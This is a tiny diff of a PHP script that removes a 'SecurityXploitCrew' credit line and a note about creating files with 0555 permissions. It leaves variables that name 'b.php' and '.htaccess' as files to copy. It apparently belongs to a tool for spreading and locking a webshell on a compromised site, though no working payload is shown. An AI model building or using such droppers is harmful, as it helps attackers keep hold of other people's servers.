@@ -1,6 +1,5 @@
 <?php
-// SecurityXploitCrew
-// This script will ensure that files are created and then set permissions to 0555 for both files and directories
+
 
 $sourceFile1 = "b.php"; // File yang mau dicopy
 $sourceFile2 = ".htaccess"; // File yang mau dicopy .htaccess
